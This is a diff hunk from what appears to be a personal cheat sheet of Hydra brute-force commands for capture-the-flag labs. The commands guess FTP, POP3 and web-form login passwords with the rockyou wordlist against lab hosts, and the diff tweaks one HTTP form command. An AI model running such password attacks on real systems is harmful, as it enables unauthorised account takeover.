@@ -217,7 +217,7 @@ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.225.50 -vV
 
 hydra hogwartz-castle.thm http-form-post "/login/index.php:user=^USER^&password=^PASS^:Incorrect Username or Password" -l Hagrid -P /usr/share/wordlists/rockyou.txt
 
-hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:user=^USER^&pass=^PASS^:Username or password invalid” -f
+hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid” -f -vV  ***
 
 hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.117.44:55007 -Vv 
 	
